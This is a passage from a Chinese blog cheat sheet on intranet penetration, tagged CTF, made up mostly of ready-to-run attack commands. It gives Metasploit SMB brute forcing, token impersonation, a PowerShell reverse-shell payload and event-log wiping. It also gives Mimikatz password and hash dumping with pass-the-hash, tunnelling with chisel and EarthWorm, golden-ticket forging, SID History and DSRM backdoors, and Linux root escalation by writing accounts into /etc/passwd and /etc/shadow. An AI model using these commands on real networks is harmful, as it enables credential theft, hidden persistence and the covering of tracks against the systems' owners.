</span></span><span class="line"><span class="cl"><span class="n">golden_ticket_create</span><span class="err">：创建黄金票据</span>
</span></span><span class="line"><span class="cl"><span class="n">kerberos_ticket_list</span><span class="err">：列举</span><span class="n">kerberos票据</span>
</span></span><span class="line"><span class="cl"><span class="n">kerberos_ticket_purge</span><span class="err">：清除</span><span class="n">kerberos票据</span>
</span></span><span class="line"><span class="cl"><span class="n">kerberos_ticket_use</span><span class="err">：使用</span><span class="n">kerberos票据</span>
</span></span><span class="line"><span class="cl"><span class="n">kiwi_cmd</span><span class="err">：执行</span><span class="n">mimikatz的命令</span><span class="err">，后面接</span><span class="n">mimikatz</span><span class="o">.</span><span class="n">exe的命令</span>
</span></span><span class="line"><span class="cl"><span class="n">lsa_dump_sam</span><span class="err">：</span><span class="n">dump出lsa的SAM</span>
</span></span><span class="line"><span class="cl"><span class="n">lsa_dump_secrets</span><span class="err">：</span><span class="n">dump出lsa的密文</span>
</span></span><span class="line"><span class="cl"><span class="n">password_change</span><span class="err">：修改密码</span>
</span></span><span class="line"><span class="cl"><span class="n">wifi_list</span><span class="err">：列出当前用户的</span><span class="n">wifi配置文件</span>
</span></span><span class="line"><span class="cl"><span class="n">wifi_list_shared</span><span class="err">：列出共享</span><span class="n">wifi配置文件</span><span class="o">/</span><span class="err">编码</span>
</span></span></code></pre></div><h3 id="msf-smb爆破密码">MSF smb爆破密码<a hidden class="anchor" aria-hidden="true" href="#msf-smb爆破密码">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/scanner/smb/smb_login
</span></span><span class="line"><span class="cl">set SMBUser administrator
</span></span><span class="line"><span class="cl">set PASS_FILE /root/fuzzDicts/passwordDict/top500.txt
</span></span><span class="line"><span class="cl">set rhost 192.168.93.10
</span></span><span class="line"><span class="cl">exploit
</span></span></code></pre></div><h3 id="msf-令牌偷取用于提权">MSF 令牌偷取（用于提权）<a hidden class="anchor" aria-hidden="true" href="#msf-令牌偷取用于提权">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">getuid    #查看当前token
</span></span><span class="line"><span class="cl">use incognito #加载incognito
</span></span><span class="line"><span class="cl">list_tokens -u #列出AccessToken
</span></span><span class="line"><span class="cl">impersonate_token &#34;TEST\adminitrator&#34; #模拟TEST\adminitrator用户
</span></span><span class="line"><span class="cl">rev2self   #返回到之前的AccessToken权限
</span></span></code></pre></div><h3 id="msf存活主机探测">MSF存活主机探测<a hidden class="anchor" aria-hidden="true" href="#msf存活主机探测">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/scanner/discovery/udp_probe
</span></span><span class="line"><span class="cl">set rhosts 192.168.183.0/24
</span></span><span class="line"><span class="cl">set threads 5
</span></span><span class="line"><span class="cl">exploit
</span></span></code></pre></div><h3 id="msf-powershell-攻击">MSF powershell 攻击<a hidden class="anchor" aria-hidden="true" href="#msf-powershell-攻击">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">script</span><span class="o">/</span><span class="n">web_delivery</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">target</span> <span class="mi">2</span>    <span class="c1"># 选择使用powershell类型的payload</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lport</span> <span class="mi">2222</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">lhost</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">135.150</span>
</span></span><span class="line"><span class="cl"><span class="n">exploit</span>
</span></span></code></pre></div><h3 id="msf清除痕迹">MSF清除痕迹<a hidden class="anchor" aria-hidden="true" href="#msf清除痕迹">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run event_manager -i
</span></span><span class="line"><span class="cl">run event_manager -c
</span></span></code></pre></div><h2 id="小工具使用">小工具使用<a hidden class="anchor" aria-hidden="true" href="#小工具使用">#</a></h2>
<h3 id="mimitakz使用">Mimitakz使用<a hidden class="anchor" aria-hidden="true" href="#mimitakz使用">#</a></h3>
<ol>
<li>获取账号密码</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug #权限提升
</span></span><span class="line"><span class="cl">sekurlsa::logonPasswords #获取账号密码
</span></span></code></pre></div><ol start="2">
<li>获取NTLM hash</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
</span></span><span class="line"><span class="cl">token::elevate
</span></span><span class="line"><span class="cl">lsadump::sam
</span></span></code></pre></div><ol start="3">
<li>hash攻击 （会弹出一个cmd窗口，有风险）</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
</span></span><span class="line"><span class="cl">sekurlsa::pth /domain:DC /user:Administrator /ntlm:e8bea972b3549868cecd667a64a6ac46
</span></span><span class="line"><span class="cl">#DC是域控的名称 ntlm是上述获得结果
</span></span></code></pre></div><h3 id="eeathworm使用">Eeathworm使用<a hidden class="anchor" aria-hidden="true" href="#eeathworm使用">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-l listenport  open a port for the service startup.      // 为服务启动打开一个端口。
</span></span><span class="line"><span class="cl">-d refhost set the reflection host address.                // 设置反连主机地址。
</span></span><span class="line"><span class="cl">-e refport set the reflection port.                              // 设置反连端口。
</span></span><span class="line"><span class="cl">-f connhost set the connect host address .               // 设置连接主机地址。
</span></span><span class="line"><span class="cl">-g connport set the connect port.                             // 设置连接端口。
</span></span><span class="line"><span class="cl">-t usectime set the milliseconds for timeout. The default value is 1000 // 设置超时的毫秒数。默认值值为1000
</span></span><span class="line"><span class="cl">-s state setup the function.                       // 状态设置功能。共有六种ssocksd rcsocks rssocks lcx_slave lcx_tran lcx_listen
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ssocksd rcsocks rssocks 为socket5 正向代理，反向代理，正反向代理
</span></span><span class="line"><span class="cl">lcx_slave 控制管道：一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。
</span></span><span class="line"><span class="cl">lcx_tran 转发管道：通过监听本地端口接收代理请求，并转交给代理提供主机。
</span></span><span class="line"><span class="cl">lcx_listen 监听管道：通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。
</span></span></code></pre></div><h3 id="proxychains4-使用方法">proxychains4 使用方法<a hidden class="anchor" aria-hidden="true" href="#proxychains4-使用方法">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 nmap -p 3389 -Pn -sT 192.168.52.141   # 需要配置/etc/proxychains4.conf文件   -Pn和-sT必须要有， 192.168.52.141是要扫描的内网地址
</span></span></code></pre></div><h3 id="chisel使用">chisel使用<a hidden class="anchor" aria-hidden="true" href="#chisel使用">#</a></h3>
<ol>
<li>端口转发 #将本地的11111端口转发到服务器上的8000端口</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">正向链接
</span></span><span class="line"><span class="cl"> ./chisel server -p 12345  
</span></span><span class="line"><span class="cl"> chisel.exe client 192.168.61.128:12345 11111:127.0.0.1:8000
</span></span><span class="line"><span class="cl"> 反向链接
</span></span><span class="line"><span class="cl"> chisel.exe server -p 12345 --reverse
</span></span><span class="line"><span class="cl"> ./chisel client 192.168.61.129:12345 R:11111:127.0.0.1:8000
</span></span></code></pre></div><ol>
<li>socks代理  本地1088端口代理服务器</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">正向链接
</span></span><span class="line"><span class="cl">chisel.exe server -p 12345 --socks5
</span></span><span class="line"><span class="cl">./chisel client 192.168.61.129:12345 1088:socks
</span></span><span class="line"><span class="cl">反向链接
</span></span><span class="line"><span class="cl">./chisel server -p 12345 --reverse  --socks5
</span></span><span class="line"><span class="cl">./chisel client 192.168.111.2:12345 R:1088:socks
</span></span></code></pre></div><h2 id="权限维持">权限维持<a hidden class="anchor" aria-hidden="true" href="#权限维持">#</a></h2>
<h3 id="黄金票据">黄金票据<a hidden class="anchor" aria-hidden="true" href="#黄金票据">#</a></h3>
<ol>
<li>导出域控制器用户密码或hash</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
</span></span><span class="line"><span class="cl">lsadump::lsa /patch        # 专用于在域控制器上导出用户密码或hash
</span></span></code></pre></div><ol start="2">
<li>切换到用户主机下使用minikatz生成票据</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kerberos::golden /user:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:ticket.kirbi
</span></span><span class="line"><span class="cl"> # kerberos::golden /user:需要伪造的域管理员用户名 /domain:demo.com /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi
</span></span></code></pre></div><ol start="3">
<li>修改票据</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kerberos::purge   #先清空所有票据
</span></span><span class="line"><span class="cl">kerberos::ptt ticket.kirbi    #再将生成的票据注入域用户主机Windows7中
</span></span><span class="line"><span class="cl">kerberos::tgt #查看系统票据
</span></span></code></pre></div><h3 id="sid-history域后门">SID History域后门<a hidden class="anchor" aria-hidden="true" href="#sid-history域后门">#</a></h3>
<ol>
<li>
<p>添加恶意用户
<code>net user aaa Aaa123456 /add #添加用户名为aaa密码为Aaa123456的用户 </code></p>
</li>
<li>
<p>使用mimikatz将域管理员的SID添加到恶意域用户</p>
</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
</span></span><span class="line"><span class="cl">sid::patch
</span></span><span class="line"><span class="cl">sid::add /sam:aaa /new:Administrator   //将管理员Administrator的SID添加到用户aaa的SID History属性中
</span></span></code></pre></div><h3 id="dsrm-后门">DSRM 后门<a hidden class="anchor" aria-hidden="true" href="#dsrm-后门">#</a></h3>
<ol>
<li>修改DSRM账户（需要远程登录调用cmd窗口，有危险）</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ntdsutil    // 进入ntdsutil
</span></span><span class="line"><span class="cl">set dsrm password    // 设置DSRM账户的密码
</span></span><span class="line"><span class="cl">reset password on server null    // 在当前域控制器上恢复DSRM密码
</span></span><span class="line"><span class="cl">&lt;password&gt;    // 输入新密码
</span></span><span class="line"><span class="cl">&lt;password&gt;    // 重新输入新密码
</span></span><span class="line"><span class="cl">q    //退出DSRM密码设置模式
</span></span><span class="line"><span class="cl">q    // 退出ntdsutil
</span></span></code></pre></div><ol start="2">
<li>DSRM与域用户同步（于第一步类似，不必重复）</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ntdsutil // 进入ntdsutil 
</span></span><span class="line"><span class="cl">set dsrm password // 设置DSRM账户的密码
</span></span><span class="line"><span class="cl">sync from domain account domainusername  // 使DSRM的密码和指定的domainusername域用户的密码同步
</span></span><span class="line"><span class="cl">q //退出DSRM密码设置模式    
</span></span><span class="line"><span class="cl">q // 退出ntdsutil
</span></span></code></pre></div><ol start="3">
<li>启用DSRM登录</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">New-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34; -name &#34;DsrmAdminLogonBehavior&#34; -value 2 -propertyType DWORD #powershell
</span></span><span class="line"><span class="cl">或
</span></span><span class="line"><span class="cl">reg add &#34;HKLM\System\CurrentControlSet\Control\Lsa&#34; /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2   #cmd方式
</span></span></code></pre></div><ol start="4">
<li>mimikatz获取NTLM hash （见mimikate用法）</li>
<li>mimikatz使用hash攻击 （见mimikate用法）</li>
</ol>
<h2 id="提权">提权<a hidden class="anchor" aria-hidden="true" href="#提权">#</a></h2>
<h3 id="linux提取放行普通用户提权">Linux提取放行普通用户提权<a hidden class="anchor" aria-hidden="true" href="#linux提取放行普通用户提权">#</a></h3>
<ol>
<li>创建普通用户（密码123456）</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#39;meme:x:1001:1001:,,,:/home/meme:/bin/bash&#39; &gt;&gt; /etc/passwd
</span></span><span class="line"><span class="cl">echo &#39;meme:x:1001:&#39; &gt;&gt; /etc/group
</span></span><span class="line"><span class="cl">echo &#39;meme:$6$Mig86wnH$wtvw4k8NpI7SVQ1Noc8OMb2nEg5gw5o4PBN81KIvF5Qw9WHDWo1XqD/5qt93bsJ8qarKAFERQLp/3AXAleGZn/:19625:0:99999:7:::&#39; &gt;&gt; /etc/shadow
</span></span><span class="line"><span class="cl">echo &#39;meme:!::&#39; &gt;&gt; /etc/gshadow
</span></span></code></pre></div><ol start="2">
<li>提权</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#39;ubuntu ALL=(ALL:ALL) ALL&#39; &gt;&gt; /etc/sudoers  #需要root权限才能做，不能使用sudo
</span></span><span class="line"><span class="cl">sudo su root #输入ubuntu用户的密码即可
</span></span></code></pre></div><ol start="3">
<li>创建root用户（密码123456）</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#39;xi:x:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwd
</span></span><span class="line"><span class="cl">echo &#39;xi:x:0:&#39; &gt;&gt; /etc/group
</span></span><span class="line"><span class="cl">echo &#39;xi:$6$Mig86wnH$wtvw4k8NpI7SVQ1Noc8OMb2nEg5gw5o4PBN81KIvF5Qw9WHDWo1XqD/5qt93bsJ8qarKAFERQLp/3AXAleGZn/:19625:0:99999:7:::&#39; &gt;&gt; /etc/shadow
</span></span><span class="line"><span class="cl">echo &#39;xi:!::&#39; &gt;&gt; /etc/gshadow
</span></span></code></pre></div><h3 id="suid-ps程序提权">suid ps程序提权<a hidden class="anchor" aria-hidden="true" href="#suid-ps程序提权">#</a></h3>
<ol>
<li>前提条件，存在一个SUID程序，并且该程序调用ps命令</li>
<li>判断条件：</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find / -perm -u=s -type f 2&gt;/dev/null   # 查找短暂拥有root权限的命令程序
</span></span></code></pre></div><ol start="3">
<li>修改环境变量，伪造ps命令</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cd</span> <span class="o">/</span><span class="n">tmp</span>
</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> <span class="o">&gt;</span> <span class="n">ps</span>
</span></span><span class="line"><span class="cl"><span class="n">chmod</span> <span class="mi">777</span> <span class="n">ps</span>
</span></span><span class="line"><span class="cl"><span class="k">export</span> <span class="n">PATH</span><span class="o">=/</span><span class="n">tmp</span><span class="p">:</span><span class="o">$</span><span class="n">PATH</span> <span class="c1"># 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</span>
</span></span><span class="line"><span class="cl"><span class="err">或</span> <span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ps</span>
</span></span></code></pre></div><ol start="4">
<li>执行判断条件2中获取的程序。</li>
</ol>
<blockquote>
<p><strong>警告</strong>：需要在反弹shell上使用，无法在webshell上成功执行和提权，需要全交交互式才行</p>
</blockquote>
<h3 id="linux-ssh免登录方式">linux ssh免登录方式<a hidden class="anchor" aria-hidden="true" href="#linux-ssh免登录方式">#</a></h3>
<ol>
<li>本地生成文件</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh-keygen -t rsa  #生成公钥和私钥
</span></span><span class="line"><span class="cl">(echo -e &#34;\n\n&#34;; cat ~/.ssh/id_rsa.pub; echo -e &#34;\n\n&#34;) &gt; public.txt #到处公钥
</span></span><span class="line"><span class="cl">(echo -e &#34;\n\n&#34;; cat /root/.ssh/id_rsa; echo -e &#34;\n\n&#34;) &gt; private.txt #到处私钥
</span></span></code></pre></div><ol start="2">
<li>公钥上传</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cp -avx ~/ubuntu/.ssh/id_rsa.pub ~/.ssh/authorized_keys  #~/.ssh/authorized_keys 是上传的文件路径 
</span></span><span class="line"><span class="cl">echo &#39;生成的.pub文件的内容即hello.pub&#39; &gt; ~/.ssh/authorized_keys 　　　　　　                           #写入文件
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://ruralbee.github.io/tags/ctf/">CTF</a></li>
      <li><a href="https://ruralbee.github.io/tags/%E5%86%85%E7%BD%91/">内网</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://ruralbee.github.io/posts/ai/stablediffusion/">
    <span class="title">« 上一页</span>
    <br>
    <span>Stable Diffusion安装</span>
  </a>
  <a class="next" href="https://ruralbee.github.io/posts/ctf/ctf_cloudsec/">
    <span class="title">下一页 »</span>
    <br>
    <span>云安全总结</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share 内网渗透总结 on x"
        href="https://x.com/intent/tweet/?text=%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f%e6%80%bb%e7%bb%93&amp;url=https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fctf_intranet%2f&amp;hashtags=CTF%2c%e5%86%85%e7%bd%91">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z"/>
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share 内网渗透总结 on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fctf_intranet%2f&amp;title=%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f%e6%80%bb%e7%bb%93&amp;summary=%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f%e6%80%bb%e7%bb%93&amp;source=https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fctf_intranet%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share 内网渗透总结 on reddit"
        href="https://reddit.com/submit?url=https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fctf_intranet%2f&title=%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f%e6%80%bb%e7%bb%93">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share 内网渗透总结 on facebook"
        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fctf_intranet%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share 内网渗透总结 on whatsapp"
        href="https://api.whatsapp.com/send?text=%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f%e6%80%bb%e7%bb%93%20-%20https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fctf_intranet%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share 内网渗透总结 on telegram"
        href="https://telegram.me/share/url?text=%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f%e6%80%bb%e7%bb%93&amp;url=https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fctf_intranet%2f">
        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
            <path
                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share 内网渗透总结 on ycombinator"
        href="https://news.ycombinator.com/submitlink?t=%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f%e6%80%bb%e7%bb%93&u=https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fctf_intranet%2f">
        <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
            xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
            <path
